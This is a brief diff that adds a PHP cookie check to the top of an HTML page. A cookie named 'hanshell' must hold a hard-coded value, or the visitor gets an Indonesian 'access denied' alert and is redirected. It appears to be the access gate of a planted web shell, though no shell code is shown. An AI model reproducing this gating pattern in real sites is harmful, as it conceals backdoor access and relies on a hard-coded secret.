@@ -1,4 +1,13 @@
-
+<?php
+$valid_cookie_value = 'raygans';
+if (!isset($_COOKIE['hanshell']) || $_COOKIE['hanshell'] !== $valid_cookie_value) {
+    echo '<script>
+            alert("Akses ditolak! Silakan Login.");
+            window.location.href = window.location.origin;
+          </script>';
+    exit();
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
